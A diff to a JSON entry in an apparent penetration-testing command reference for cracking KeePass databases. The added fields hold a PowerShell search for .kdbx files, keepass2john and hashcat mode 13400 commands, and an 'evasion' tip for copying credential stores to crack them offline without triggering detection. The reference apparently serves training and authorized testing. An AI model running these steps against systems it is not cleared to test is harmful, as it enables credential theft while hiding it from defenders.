@@ -69,7 +69,7 @@
   ],
   "id": "keepass2john-crack",
   "name": "Credential Hunting - Crack KeePass Database",
-  "command": "keepass2john <db>.kdbx > keepass.hash && hashcat -m 13400 keepass.hash rockyou.txt",
+  "command": "keepass2john <kdbx_file> > keepass.hash && hashcat -m 13400 keepass.hash rockyou.txt",
   "description": "Extract a crackable hash from a found .kdbx KeePass database and brute-force the master password offline with hashcat mode 13400.",
   "opsec": "loud",
   "mitre": [
@@ -90,6 +90,27 @@
       "HTB M26",
       "MITRE T1555",
       "MITRE T1110.002"
-    ]
-  }
+    ],
+    "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+  },
+  "variations": [
+    {
+      "label": "hashcat mode 13400",
+      "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find the .kdbx",
+      "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
+    },
+    {
+      "label": "Extract the hash",
+      "command": "keepass2john <kdbx_file> > keepass.hash"
+    },
+    {
+      "label": "Crack it",
+      "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
+    }
+  ]
 }
